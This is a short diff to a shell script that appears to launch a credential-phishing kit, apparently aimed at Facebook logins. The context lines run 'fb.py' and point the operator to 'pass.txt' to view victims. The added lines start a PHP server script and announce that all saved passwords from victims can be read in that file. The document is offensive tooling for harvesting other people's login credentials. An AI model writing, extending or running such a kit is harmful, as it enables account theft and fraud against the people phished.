@@ -7,3 +7,6 @@ read opt_ion
 python fb.py
 echo
 echo "TYPE \'nano pass.txt\' To View Victims"
+php start.php
+clear
+echo "To access all saved passwords from victims, type \'nano pass.txt\'"
